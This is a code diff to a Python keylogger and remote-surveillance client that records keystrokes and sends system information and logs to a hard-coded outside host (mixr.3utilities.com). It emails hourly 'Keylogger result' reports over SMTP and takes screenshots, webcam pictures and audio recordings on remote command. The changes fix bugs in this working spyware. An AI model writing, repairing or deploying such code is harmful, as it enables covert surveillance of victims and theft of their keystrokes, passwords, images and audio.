@@ -59,10 +59,12 @@ class KeyLoggerClient:
 
 
 	def run(self):
+		global stop_threads
+
 		data = get_system_information(sys_name)
 		data[1].append(self.connection.pc_ip)
 		data = str(data)
-		self.connection.client.sendall(data.encode('utf-8'))
+		self.connection.client.sendall(data.encode())
 
 		keyboard_listener = Listener(on_release=self.on_release)
 		keyboard_listener.start()
@@ -76,7 +78,7 @@ class KeyLoggerClient:
 				data = str(data)
 
 				try:
-					self.connection.client.sendall(data.encode('utf-8'))
+					self.connection.client.sendall(data.encode())
 				except:
 					stop_threads = True
 					self.connection.client.close()
@@ -96,11 +98,13 @@ class KeyLoggerClient:
 
 				write_file(os.path.join(temp_path, filename), data)
 
-				if date_time[13:15] != prev_hours:
-					prev_hours = date_time[13:15]
+			if get_time()[13:15] != prev_hours:
+				prev_hours = get_time()[13:15]
+
+				if os.path.isfile(os.path.join(temp_path, filename)):
 					msg = MIMEMultipart()
-					msg['From'] = email_address
-					msg['To'] = email_address
+					msg['From'] = self.email_address
+					msg['To'] = self.email_address
 					msg['Subject'] = 'Keylogger result'
 					body = date_time
 					msg.attach(MIMEText(body, 'plain'))
@@ -128,7 +132,7 @@ class KeyLoggerClient:
 					with smtplib.SMTP(self.smtp_alias, self.smtp_port) as smtp_server:
 						smtp_server.starttls()
 						smtp_server.login(self.email_address, self.email_password)
-						smtp_server.sendmail(email_address, email_address, content)
+						smtp_server.sendmail(self.email_address, self.email_address, content)
 
 					if os.path.isfile(os.path.join(temp_path, filename)):
 						os.remove(os.path.join(temp_path, filename))
@@ -146,14 +150,16 @@ class MenuHandlerClient(threading.Thread):
 
 
 	def run(self):
+		global stop_threads
+
 		while True:
 			try:
-				option = self.connection.client.recv(24).decode('utf-8')
+				option = self.connection.client.recv(24).decode()
 			except:
 				break
 
+			date_time = datetime.now().strftime("%d_%H_%M_%S")
 			if option == '1':
-				date_time = datetime.now().strftime("%d_%H_%M_%S")
 				data = ["image", date_time]
 
 				if take_screenshot(temp_path):
@@ -166,11 +172,10 @@ class MenuHandlerClient(threading.Thread):
 					data.append("Error")
 
 				try:
-					self.connection.client.sendall(str(data).encode('utf-8'))
+					self.connection.client.sendall(str(data).encode())
 				except:
 					break
 			elif option == '2':
-				date_time = datetime.now().strftime("%d_%H_%M_%S")
 				data = ["wcpic", date_time]
 
 				if take_webcam_picture(temp_path):
@@ -183,11 +188,10 @@ class MenuHandlerClient(threading.Thread):
 					data.append("Error")
 
 				try:
-					self.connection.client.sendall(str(data).encode('utf-8'))
+					self.connection.client.sendall(str(data).encode())
 				except:
 					break
 			elif option == '3':
-				date_time = datetime.now().strftime("%d_%H_%M_%S")
 				data = ["audio", date_time]
 
 				if record_audio(temp_path):
@@ -200,14 +204,19 @@ class MenuHandlerClient(threading.Thread):
 					data.append("Error")
 
 				try:
-					self.connection.client.sendall(str(data).encode('utf-8'))
+					self.connection.client.sendall(str(data).encode())
 				except:
 					break
 			elif option == '4' or stop_threads:
+				data = ["close", date_time, "Exit"]
+				self.connection.client.sendall(str(data).encode())
+				self.connection.client.close()
 				break
 
 
 def main():
+	global stop_threads
+
 	client = Client(ip_address='mixr.3utilities.com', port=10001)
 
 	try:
